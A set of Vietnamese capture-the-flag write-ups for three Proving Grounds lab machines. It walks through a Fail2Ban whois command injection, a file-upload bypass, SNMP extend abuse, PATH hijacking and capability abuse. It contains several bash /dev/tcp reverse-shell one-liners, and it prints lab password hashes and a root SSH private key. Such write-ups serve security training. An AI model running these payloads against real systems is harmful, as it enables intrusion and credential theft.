# Proving Grounds: Arin



| Machine  | Difficulty       | CVE/0-days |
| -------- | ---------------- | ---------- |
| Linux    | Intermediate     | None       |


Nmap scan:

```console 
$ nmap -p- -r --max-rate 1500 -e tun0 -oN nmap.txt -vv 192.168.62.185
...
PORT     STATE  SERVICE REASON
22/tcp   open   ssh     syn-ack
43/tcp   open   whois   syn-ack
80/tcp   open   http    syn-ack
4321/tcp closed rwhois  conn-refused
```

Sử dụng `feroxbuster`, không tìm thấy gì thú vị:

```console 
$ feroxbuster --url http://192.168.62.185/
...
200       47l      118w        0c http://192.168.62.185/login
302        1l        5w        0c http://192.168.62.185/logs
200       67l      181w     1722c http://192.168.62.185/404
200      106l      289w        0c http://192.168.62.185/signup
302        1l        5w        0c http://192.168.62.185/settings
302        1l        5w        0c http://192.168.62.185/whois
200       66l      165w     1635c http://192.168.62.185/500
200       67l      176w     1705c http://192.168.62.185/422
[####################] - 2m     29999/29999   0s      found:8       errors:0   
[####################] - 2m     29999/29999   181/s   http://192.168.62.185/
```

Thử truy cập vào HTTP tại port 80 thì được đưa về `/login`:

![](https://i.imgur.com/ykPMdhQ.png)

Chuyển sang `/signup`, thông tin cơ bản gồm có:

![](https://i.imgur.com/KM3S4CH.png)

Sử dụng `sipcalc` để tính netmask bits của mình:

```console 
$ sipcalc 192.168.49.162
...
Network address		- 192.168.49.162
Network mask		- 255.255.255.255
Network mask (bits)	- 32
...
```

Nhập các thông tin vào và signup:

![](https://i.imgur.com/6GSSTK0.png)

Search lỗi `25: Connection refused` thì ra `Postfix Connection refused (port 25)`

Triển khai một `SMTP Server` ảo thông qua `python`:

```console 
$ sudo python -m smtpd -n -c DebuggingServer 192.168.49.62:25
```

Giờ quay lại `/signup`, đăng kí lại:

![](https://i.imgur.com/6khHnCJ.png)

Bên phía terminal chạy SMTP Server ảo:

![](https://i.imgur.com/2Iq2Pa4.png)

Truy cập vào đường link được gửi, ta hoàn tất việc đăng kí.

![](https://i.imgur.com/LD9VDv5.png)

Bên tab `RWHOIS`, ta thấy có `Host` và `Save` đang bị `disabled`:

![](https://i.imgur.com/07W8J10.png)

Sử dụng BurpSuite để xoá thuộc tính `disabled` (Proxy/Options/Match and Replace/Add)

![](https://i.imgur.com/CpDEN6L.png)

Reload lại trang ta sẽ thấy mình edit được Host:

![](https://i.imgur.com/DEqk9nN.png)

Sửa host thành IP mình và save:

![](https://i.imgur.com/YSwnbgh.png)

Trên web, chuyển sang `/logs` ta thấy có `Fail2Ban`, thử `ssh` sai xem có ghi log gì không?

![](https://i.imgur.com/IIyBb9t.png)

Quay trở lại với `RWHOIS`, sau khi đã cập nhật Host, thử dùng `whois` để kiểm tra:

```console 
$ whois -h 192.168.62.185 192.168.49.62

#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2021, American Registry for Internet Numbers, Ltd.
#


NetRange:       N/A
CIDR:           192.168.49.62/32
NetName:        A-PG
NetType:        Direct Assignment
Organization:   a (A-PG2)
RegDate:        2022-09-27 07:10:31 UTC
Updated:        2022-09-27 10:27:41 UTC


OrgName:        a
OrgId:          A-PG2
Address:        a
City:           a
StateProv:      a
PostalCode:     10169
Country:        a
RegDate:        2022-09-27 07:10:31 UTC
Updated:        2022-09-27 10:27:41 UTC
OrgAbuseEmail:  a@gmail.com

#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2021, American Registry for Internet Numbers, Ltd.
#

Found a referral to 192.168.49.62.
```

Mỗi lần chạy `whois`, nó sẽ request đến port `4321`, vì thế, thử lại `whois` và `nc -lvnp 4321`:

![](https://i.imgur.com/yEyZ2Z6.png)

Ta thấy dòng `Testtt` có hiển thị ngược lại trong phần response của `whois`, ta có thể lợi dụng điểu này.

Thông qua [đây](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm), tìm được các chạy câu lệnh thông qua `whois` bằng cách sử dụng `~!` hoặc `~|`

Nhưng có vẻ không được:

![](https://i.imgur.com/ScChvhN.png)

Có thể thấy ở bên `tcpdump` không hề nhận được gói tin `ICMP` nào.

Vậy còn `Fail2Ban`? Có thể thấy nó đang monitor SSH, nhưng nếu khi ta bị ban thì nó chạy cái gì?

Thực ra ở `/logs` ta sẽ thấy những thông tin được in ra khá giống với format của link trên, vậy có thể sau khi ban, Fail2Ban sẽ gửi một `rwhois` request đến IP của mình.

Thử lại một lần nữa:

![](https://i.imgur.com/OGw0jA3.png)

Như vậy ta đã tìm được cách để RCE:

```console 
$ echo "~| /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.49.62/80 0>&1'" | nc -lvnp 4321
```

![](https://i.imgur.com/OfzEXMO.png)

Nhân tiện có cả quyền root luôn, khỏi phải leo :v 

# Proving Grounds: Escape

|Machine|Difficulty|
| - | - |
|Linux|Hard|


---

**Table of content**
* [I. Recon](#I-Recon)
* [II. File Upload Bypass](#II-File-upload-bypass)
* [III. Docker Escaping](#III-Docker-escaping)
* [IV. PrivEsc](#IV-PrivEsc)
    * [1. Get real user](#1-Get-real-user)
    * [2. PrivEsc](#2-PrivEsc)

---

## I. Recon

`nmap` scan:

```shell 
# Nmap 7.92 scan initiated Thu Sep 29 16:53:26 2022 as: nmap -p- --max-rate 1500 -r -oN nmap.txt -vv 192.168.62.113
Nmap scan report for 192.168.62.113
Host is up, received syn-ack (0.25s latency).
Scanned at 2022-09-29 16:53:26 +07 for 2951s
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
80/tcp   open  http       syn-ack
8080/tcp open  http-proxy syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Sep 29 17:42:37 2022 -- 1 IP address (1 host up) scanned in 2951.39 seconds
```

Đào sâu hơn vào 3 port `22, 80, 8080`:

```shell 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 09:09 +07
Nmap scan report for 192.168.143.113
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f0:85:61:65:d3:88:ad:49:6b:38:f4:ac:5b:90:4f:2d (RSA)
|   256 05:80:90:92:ff:9e:d6:0e:2f:70:37:6d:86:76:db:05 (ECDSA)
|_  256 c3:57:35:b9:8a:a5:c0:f8:b1:b2:e9:73:09:ad:c7:9a (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Escape
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Escape
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.63 seconds
```

Trông có vẻ port `8080` sẽ thu thập được nhiều thông tin hơn, sử dụng `feroxbuster` để scan:

```shell 
403        9l       28w      282c http://192.168.143.113:8080/.htpasswd
403        9l       28w      282c http://192.168.143.113:8080/.htaccess
403        9l       28w      282c http://192.168.143.113:8080/.hta
301        9l       28w      323c http://192.168.143.113:8080/dev
403        9l       28w      282c http://192.168.143.113:8080/dev/.htpasswd
403        9l       28w      282c http://192.168.143.113:8080/dev/.hta
403        9l       28w      282c http://192.168.143.113:8080/dev/.htaccess
200       16l       17w      159c http://192.168.143.113:8080/index.html
301        9l       28w      327c http://192.168.143.113:8080/dev/css
403        9l       28w      282c http://192.168.143.113:8080/dev/css/.htaccess
403        9l       28w      282c http://192.168.143.113:8080/dev/css/.htpasswd
403        9l       28w      282c http://192.168.143.113:8080/dev/css/.hta
200       36l       79w     1021c http://192.168.143.113:8080/dev/index.php
403        9l       28w      282c http://192.168.143.113:8080/server-status
301        9l       28w      331c http://192.168.143.113:8080/dev/uploads
403        9l       28w      282c http://192.168.143.113:8080/dev/uploads/.htaccess
403        9l       28w      282c http://192.168.143.113:8080/dev/uploads/.hta
403        9l       28w      282c http://192.168.143.113:8080/dev/uploads/.htpasswd
```

Ta thấy có `/dev/index.php` truy cập được:

![](https://i.imgur.com/o0jGrDe.png)

## II. File upload bypass

Thử upload 1 file không phải `.gif`:

![](https://i.imgur.com/IupYizK.png)

Thử thay `Content-Type` thành `image/gif`:

![](https://i.imgur.com/TNLdPOR.png)

Như vậy, ta có thể upload một file `.php` để reverse shell bằng cách tương tự, file sau khi được upload có lẽ đi vào `/dev/uploads` (dựa theo kết quả của `feroxbuster`)

![](https://i.imgur.com/ktGBrHF.png)

Ok, lặp lại các bước trên với `rev.php`:

![](https://i.imgur.com/VdI17Ga.png)

![](https://i.imgur.com/F70Iboi.png)

Nhìn cái hostname `a7c367c2113d` kia, có thể khá chắc là chúng ta đang ở trong một cái Docker Container, để chắc chắn ta có thể dùng `ls -la /`:

```shell 
www-data@a7c367c2113d:/$ ls -la
ls -la
total 80
...
-rwxrxr-x   1 root root    0 Dec 21  2020 .dockerenv
...
```

Có `.dockerenv`, chắc chắn đây là bên trong một cái Docker.

## III. Docker escaping

Đầu tiên, ta cần biết liệu Docker có mount cái gì từ host machine không, về cơ bản sẽ như sơ đồ này:

![](https://i.imgur.com/b81h6dI.png)

Sử dụng `df -T` để biết điều đó:

```shell 
www-data@a7c367c2113d:/$ df -T 
Filesystem     Type    1K-blocks    Used Available Use% Mounted on
overlay        overlay  16446332 4439108  11152084  29% /
tmpfs          tmpfs       65536       0     65536   0% /dev
tmpfs          tmpfs      504616       0    504616   0% /sys/fs/cgroup
shm            tmpfs       65536       0     65536   0% /dev/shm
/dev/sda1      ext4     16446332 4439108  11152084  29% /tmp
tmpfs          tmpfs      504616       0    504616   0% /proc/acpi
tmpfs          tmpfs      504616       0    504616   0% /proc/scsi
tmpfs          tmpfs      504616       0    504616   0% /sys/firmware
```

Ta để ý thấy `/dev/sda1` được mount vào `/tmp`

Vọc vạch một chút trong Docker, thấy một folder `/var/backups`:

![](https://i.imgur.com/uZR5q02.png)

List file:

![](https://i.imgur.com/PjtSBBP.png)

Nội dung file `.snmpd.conf` (loại bỏ những dòng trống và comment `#`):

```shell 
www-data@a7c367c2113d:/$ grep -v '#' /var/backups/.snmpd.conf |  grep -v '^[[:space:]]*$'
gentAddress  udp:0.0.0.0:161
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1
 rocommunity public  default    -V systemonly
 rocommunity6 public  default   -V systemonly
 rocommunity 53cur3M0NiT0riNg
 rouser   authOnlyUser
sysLocation    Sitting on the Dock of the Bay
sysContact     Me <me@example.org>
sysServices    72
proc  mountd
proc  ntalkd    4
proc  sendmail 10 1
disk       /     10000
disk       /var  5%
includeAllDisks  10%
load   12 10 5
 trapsink     localhost public
iquerySecName   internalUser       
rouser          internalUser
defaultMonitors          yes
linkUpDownNotifications  yes
 extend    test1   /bin/echo  Hello, world!
 extend-sh test2   echo Hello, world! ; echo Hi there ; exit 35
 extend-sh test3   /bin/sh /tmp/shtest
 master          agentx
```

Ta sẽ tập trung vào những dòng này:

```console 
rocommunity 53cur3M0NiT0riNg
extend    test1   /bin/echo  Hello, world!
extend-sh test2   echo Hello, world! ; echo Hi there ; exit 35
extend-sh test3   /bin/sh /tmp/shtest
```

Từ 4 dòng trên, ta biết tên kết nối là `53cur3M0NiT0riNg`, và ta có thể extend SMNP để chạy shell-script (chi tiết xem tại [đây](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce))

Ngoài ra, ta thấy có dòng `extend-sh test3   /bin/sh /tmp/shtest`, thử xem ta có quyền can thiệp vào nó không?

```shell 
www-data@a7c367c2113d:/$ ls -la /tmp
ls -la /tmp
total 44
drwxrwxrwt 11 root root 4096 Oct  5 03:09 .
drwxr-xr-x  1 root root 4096 Dec 21  2020 ..
drwxrwxrwt  2 root root 4096 Oct  5 02:49 .ICE-unix
drwxrwxrwt  2 root root 4096 Oct  5 02:49 .Test-unix
drwxrwxrwt  2 root root 4096 Oct  5 02:49 .X11-unix
drwxrwxrwt  2 root root 4096 Oct  5 02:49 .XIM-unix
drwxrwxrwt  2 root root 4096 Oct  5 02:49 .font-unix
drwx------  3 root root 4096 Oct  5 02:49 systemd-private-da5a53729ffc49b9a2d273d054e70898-apache2.service-UPPEDy
drwx------  3 root root 4096 Oct  5 02:49 systemd-private-da5a53729ffc49b9a2d273d054e70898-systemd-resolved.service-szid8i
drwx------  3 root root 4096 Oct  5 02:49 systemd-private-da5a53729ffc49b9a2d273d054e70898-systemd-timesyncd.service-dZCqwg
drwx------  2 root root 4096 Oct  5 02:49 vmware-root_674-2731152261

```

Mặc dù không có file kể trên, nhưng hoàn toàn có thể tạo mới file trong thư mục `/tmp`

Thiết lập SNMP trên Parrot:

```shell 
$ sudo apt install -y snmp snmp-mibs-downloader -y
$ sudo download-mibs
```

Thêm `mibs +ALL` vào `/etc/snmp/snmp.conf`:

![](https://i.imgur.com/uw9aZ3z.png)

Test kết nối với `snmpwalk`:

```shell 
$ snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.143.113 nsExtendOutput1
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test3" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test2" = STRING: Hello, world!
Hi there
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test3" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test1" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test2" = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test3" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."test1" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
NET-SNMP-EXTEND-MIB::nsExtendResult."test3" = INTEGER: 32512
```

Như vậy, ta có thể RCE vào máy host bằng `smnpwalk`

Tạo file `/tmp/shtest`:

```shell 
www-data@a7c367c2113d:/$ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.49.143/80 0>&1"' > /tmp/shtest
www-data@a7c367c2113d:/$ cat /tmp/shtest
/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.49.143/80 0>&1"
```

Và chạy `snmpwalk`:

![](https://i.imgur.com/TOOY7NA.png)

## IV. PrivEsc

### 1. Get real user

Có thể thấy hiện tại ta đang truy cập vào một service user, vì vậy cần phải leo root, hoặc là một user khác, điều này dễ thấy bằng `/etc/passwd`:

```shell 
Debian-snmp@escape:/$ grep -P '/bin/(sh|bash)' /etc/passwd
root:x:0:0:root:/root:/bin/bash
tom:x:1000:1000::/home/tom:/bin/sh
```

Như vậy còn user `tom` nữa.

Thử tìm executable file được sở hữu bởi `tom`:

```shell 
Debian-snmp@escape:/$ find / -type f -executable -user tom 2>/dev/null     
/usr/bin/logconsole
```

Sử dụng `ltrace` để thực thi và theo dõi, thấy rằng tại option 6 có sử dụng câu lệnh `lscpu`:

![](https://i.imgur.com/iH3SRZL.png)

Thường thì `lscpu` sẽ nằm ở `/usr/bin/lscpu`:

```shell 
Debian-snmp@escape:/$ which lscpu
/usr/bin/lscpu
```

Nhưng thay vì gọi full path, thì `logconsole` lại chỉ gọi `lscpu`. Nếu là một người hiểu về Linux, chúng ta sẽ biết ngay phải làm gì.

Đơn thuần, có một env tên là `PATH`, là một list các thư mục, mỗi lần sử dụng 1 câu lệnh nào đó trên Linux thông qua CLI, ví dụ như `ls`, hệ thống sẽ duyệt theo thứ tự trái -> phải từng thư mục trong `PATH` để tìm file `ls` và gọi nó.

Như vậy, chỉ cần làm như sau:

- Tạo 1 file `lscpu` trong một thư mục nào đó:

   ```shell 
   Debian-snmp@escape:/$ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.49.143/4444 0>&1"' > /tmp/lscpu
   Debian-snmp@escape:/$ chmod +x /tmp/lscpu
   ```

- Đưa thư mục đó vào `PATH`, ở vị trí đầu tiên:

   ```shell 
   Debian-snmp@escape:/$ echo $PATH
   /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
   Debian-snmp@escape:/$ export PATH=/tmp:$PATH
   Debian-snmp@escape:/$ echo $PATH
   /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
   ```

Và chạy lại `/usr/bin/logconsole`:

![](https://i.imgur.com/F3qi7O4.png)

Ta đã truy cập được user `tom`, tại đây có thể tạo keypair để SSH vào, giúp thao tác trên CLI được dễ hơn.

### 2. PrivEsc

Sau khi truy cập được vào `tom` và lấy được `local.txt`, ta tiến hành leo root để tìm `proof.txt`

Như đã biết, `SUID` không có tác dụng gì trong bước này, nhưng có một thứ ta có thể dùng, đó là `capabilities`

Đa số mọi người nghĩ rằng `root` là có tất cả các quyền. Không hẳn như vậy, user `root` sở hữu tất cả các `capability` mới là có tất cả các quyền

Để search binaries có `capability`:

```shell 
tom@escape:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/opt/cert/openssl =ep
```

Với `=ep` là có full `capability`, có thể sử dụng `/opt/cert/openssl` để leo quyền

Bên cạnh đó, trong thư mục `/opt/cert` còn có 1 số file khác:

```shell 
tom@escape:~$ ls -la /opt/cert/
total 724
drwxr-xr-x 2 root root   4096 Dec  9  2020 .
drwxr-xr-x 4 root root   4096 Dec  9  2020 ..
-rwx------ 1 root root   1245 Dec  9  2020 certificate.pem
-rwx------ 1 root root   1704 Dec  9  2020 key.pem
-rwxr-x--- 1 tom  tom  723944 Dec  9  2020 openssl
```

Thử chạy server HTTPS bằng `key.pem`:

```shell 
tom@escape:~$ /opt/cert/openssl s_server -key /opt/cert/key.pem -port 8888 -HTTP
Can't open server.pem for reading, No such file or directory
140597019476416:error:02001002:system library:fopen:No such file or directory:../crypto/bio/bss_file.c:72:fopen('server.pem','r')
140597019476416:error:2006D080:BIO routines:BIO_new_file:no such file:../crypto/bio/bss_file.c:79:
unable to load certificate
```

Như vậy, chúng ta phải tự gen cert thôi:

```shell 
tom@escape:~$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365
Can't load /home/tom/.rnd into RNG
140118618231232:error:2406F079:random number generator:RAND_load_file:Cannot open file:../crypto/rand/randfile.c:88:Filename=/home/tom/.rnd
Generating a RSA private key
......................................++++
............................................................................................................................................................++++
writing new private key to 'key.pem'
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

tom@escape:~$ ls -la
total 44
drwxr-xr-x 5 tom  tom         4096 Oct  5 06:06 .
drwxr-xr-x 3 root root        4096 Dec  9  2020 ..
lrwxrwxrwx 1 root root           9 Dec  9  2020 .bash_history -> /dev/null
-rw-r--r-- 1 tom  tom          220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tom  tom         3771 Apr  4  2018 .bashrc
drwx------ 2 tom  tom         4096 Oct  5 05:43 .cache
-rw-rw-r-- 1 tom  tom         1939 Oct  5 06:06 cert.pem
drwx------ 3 tom  tom         4096 Oct  5 05:43 .gnupg
-rw------- 1 tom  tom         3414 Oct  5 06:06 key.pem
-rw-r--r-- 1 tom  tom           33 Oct  5 05:15 local.txt
-rw-r--r-- 1 tom  tom          807 Apr  4  2018 .profile
drwxr-xr-x 2 tom  Debian-snmp 4096 Oct  5 05:42 .ssh
```

Khởi tạo server từ thư mục `/`:

```shell 
tom@escape:/$ cd /
tom@escape:/$ /opt/cert/openssl s_server -HTTP -cert /home/tom/cert.pem -key /home/tom/key.pem -port 8888
Enter pass phrase for /home/tom/key.pem:
Using default temp DH parameters
ACCEPT
```

Vì `/opt/cert/openssl` có full `capability`, nên ta có thể lấy `/etc/shadow` (sử dụng option `-k` của `curl` vì ta đang dùng custom cert):

```shell 
tom@escape:~$ curl -k https://localhost:8888/etc/shadow
root:$6$2dR6T6Tj$0wSNFsX6592.xq742oq1SxqjowweDrDgg5OexLM6vgkguLc.TnrH7QKeTA9LlckzcahNRiui0aSHcvSMkKcbh/:18617:0:99999:7:::
...
tom:$6$NQe6eQjI$yDV7Ae5fiktJIBu.lIrZZluL.L5NKHR10nfDD79VEhXj75jGtQ7YHissLLkKwW9UEcbqL9SAEOfuYco2dF9ih/:18617:0:99999:7:::
```

Tại đây, ta có thể lấy file `/root/proof.txt` bằng `curl -k` như trên. Nhưng tôi vẫn muốn vào `root` một cách hoàn chỉnh.

Thử xem có file `/root/.ssh/id_rsa` không?

```shell 
tom@escape:~$ curl -k https://localhost:8888/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwwvvVIS3//uz+Mpg24l51p48akveZgI8bDQDun7y9BKhRDWg
GzIzCpt7NcVWVN2llo9KOL3c3EZZxGOaTbzpINZxSWj3/WWBYhNqmKQRsgJzbPv2
kOe/XwWw8Bt9TuFAd7GUbylpbyHOES7siXFUd/XP503ehllp/JFp0G+2YPkYPGbi
0EISJcNFPNnRlXIQs3Fte0QqFiPE9nPycSMqvGz8a9OtaPGlmOZ3wP56jxxIBT0I
SrkfuLGw7b9VN05jJ33EMtDGRyyDLljFXv7t5OktkC0omumXyWG2KRRe3Avn4RMI
V+IE0rS8N2pIymRF3u8U/9YMX/Ps2EPvNQFkTQIDAQABAoIBAQCXXa/Ce6z/76pf
rU81kJ8JO4vPQkm6CIozvroWBWcumzaj5Kn38SFDXh5kQF0bR1e2XEVRe6bnG4GW
s2WQZsbVQRZxzhCGiju6jS7wfoNtDhHdxjw3gGI3sAb8j5jTmmOZgCqdihnUsPtm
wm+2ykivQAi0jO3gfYuPApqHs+ppngt2KeMUZesIz4BWuFAnS0ePK/tpTHpZ4KRj
D/sb1kdseaCmPfOD6oTMGNtTiakkDUzObN3Pw19v5wkHfawTbmsSeiPmW1nC5xh/
OI7K+wbVUCj3Dys3xqKoCMK27y+pYHzzoiz7ol+OitIth6ucDe6NC6cFbVPmW2o0
fk+U8VbRAoGBAOcfAlARjYV6qc2ukF9NYlVy/WYoP3zFzfb7uYu9I1OpLID+PYeN
ixpqKKgRoxM+ndsWWnyHjw5Kyq2+DHBE67OOpbd69y+fUYOhFiSH2TnQsB1LPtkH
ZT0pZyaBavQLZFZChpOeQ96qfEw5xwA65zENCSFoGoILHS92akVmWQnTAoGBANgK
0qNNsJYETJSob/KdnMYXbE3tPjNkdCzKXXklgZXeUKn6U//0vRhJWZGHv8RDWrlh
1wc9Op88Dx003Ay+3vVqjOs7ur46KankMTj+PN5B5CX1CioXtJ9T6qRF+8+46oq7
pXBTqfi7Gp2m+RuQJS9Ct2bu6OUYgGdUzQ8p/+VfAoGAOhCnUxhl1sAPgxY1PUxC
xTcDhLPd52oGqeNqJTpacr1Q6gN1z+V2qic7maX8s2wK2q0OBLVF8pBFxUq280nN
caoH5kXlbjh3kTtaRck/gO/2HxX1by8Vdz08pgbjqPZnuegyyUl8wadRXREy9tLV
nJQq1BLEfiFurqrwXgktm3MCgYEAroDPcyilogcG9Gy5P/cfUsJIsQkYXNqfHC65
IcmxyiQwc5vHjc9ZjexxdKN5ukXNWkA1N5u1ZjlU2/p+Y60o2oKeIMO2K0E/tgKj
36077Sq75gzvkOBk/O0Dcn000KxEhprbHsf1WvuGnCDqxeDAqFPzYClJ5QLNdKmC
mOUL1XECgYB1wX6H2xWJ+GvC1qKVs4WOYjfCvVZTh+9i8CpA1i4xmmmXXnc+jy/O
Bl7VLsdfeQ3L/NOBTng09PO2lwSWdghCMeS25rMm6/xZTOduauGVTMKx4DT7FvX6
NLU86rcVJCcqL0LdcJ7/2tmwsyuqhCLQ0fl37ZCS93LTXqGUzXfViw==
-----END RSA PRIVATE KEY-----

```

Copy file đấy về Parrot, tiến hành SSH vào `root`:

```shell 
$ chmod 0600 id_rsa
$ ssh -i id_rsa root@192.168.143.113                             
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct  5 06:28:26 EDT 2022

  System load:  0.03               Processes:              176
  Usage of /:   27.0% of 15.68GB   Users logged in:        1
  Memory usage: 40%                IP address for ens192:  192.168.143.113
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

14 packages can be updated.
10 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@escape:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Thành công leo root.

# Proving Grounds: Lunar

| Machine  | Difficulty       | CVE/0-days |
| -------- | ---------------- | ---------- |
| Linux    | Intermediate     | None       |

`nmap` scan:

```console 
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack
80/tcp    open     http    syn-ack
111/tcp   open     rpcbind syn-ack
2049/tcp  open     nfs     syn-ack
13327/tcp filtered unknown no-response
13328/tcp filtered unknown no-response
13329/tcp filtered unknown no-response
13330/tcp filtered unknown no-response
13331/tcp filtered unknown no-response
34047/tcp open     unknown syn-ack
35257/tcp open     unknown syn-ack
39811/tcp open     unknown syn-ack
40867/tcp open     unknown syn-ack
43181/tcp open     unknown syn-ack
43331/tcp open     unknown syn-ack
46871/tcp open     unknown syn-ack
57551/tcp open     unknown syn-ack
60827/tcp open     unknown syn-ack
```

Phân tích sâu hơn với `-sC -sV`:

```console 
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp    open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Lunar Studio
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open   rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      34105/udp   mountd
|   100005  1,2,3      36875/tcp   mountd
|   100021  1,3,4      45719/tcp   nlockmgr
|   100021  1,3,4      49746/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open   nfs_acl 3 (RPC #100227)
```

Kết qủa của `feroxbuster` và `dirsearch` với trang HTTP ở port `80`:

```console 
# dirsearch
...
[13:31:01] 200 -    1MB - /backup.zip
[13:31:07] 301 -  314B  - /css  ->  http://192.168.62.216/css/
[13:31:07] 302 -    0B  - /dashboard.php  ->  login.php
[13:31:13] 200 -    2KB - /favicon.ico
[13:31:14] 301 -  316B  - /fonts  ->  http://192.168.62.216/fonts/
[13:31:17] 200 -    4KB - /images/
[13:31:17] 301 -  317B  - /images  ->  http://192.168.62.216/images/
[13:31:18] 200 -   18KB - /index.html
[13:31:19] 200 -    1KB - /js/
[13:31:23] 200 -    3KB - /login.php
...
```

```console 
# feroxbuster
...
301        9l       28w      317c http://192.168.62.216/images
301        9l       28w      313c http://192.168.62.216/js
301        9l       28w      314c http://192.168.62.216/css
200       97l      234w     3383c http://192.168.62.216/login.php
301        9l       28w      316c http://192.168.62.216/fonts
302        0l        0w        0c http://192.168.62.216/dashboard.php
403        9l       28w      279c http://192.168.62.216/server-status
200        3l       13w      110c http://192.168.62.216/pending.php
...
```

Ta thấy có file `backup.zip`, download và giải nén:

![](https://i.imgur.com/KpVWyps.png)

Đọc file `login.php` ta sẽ thấy đoạn check login như sau:

```php 
$_POST['email'] && !empty($_POST['email']) && $_POST['email'] === 'liam@lunar.local' && strcmp($_POST['password'], $pwd) == 0
```

Ta biết email là `liam@lunar.local`, vậy còn password?

Để ý thì thấy tại bước check password đang sử dụng `strcmp()`, đây là hàm hay gặp lỗi logic khá... buồn cười.

Cụ thể thì ta đem `strcmp(array(), string)` thì sẽ trả về `0`, để hiểu rõ hơn có thể xem ví dụ tại [đây](https://miaxu-src.github.io/natas/2021/07/19/natas24-walkthrough.html)

